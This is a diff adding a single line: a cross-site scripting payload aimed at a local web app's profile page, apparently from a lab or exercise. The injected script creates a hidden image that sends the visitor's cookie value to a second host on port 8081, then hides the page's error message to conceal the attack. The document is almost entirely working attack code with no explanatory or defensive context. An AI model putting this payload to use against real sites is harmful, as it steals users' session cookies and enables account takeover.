@@ -1,0 +1,2 @@
+localhost:8080/profile/<script> var img=document.createElement('img');img.src="http://localhost:8081/xss_out&stolen_cookie="+document.cookie.split("=")[1];document.getElementsByTagName('body')[0].append(img);img.style.display='none';document.getElementsByClassName('error')[0].style.display='none';</script> 
+
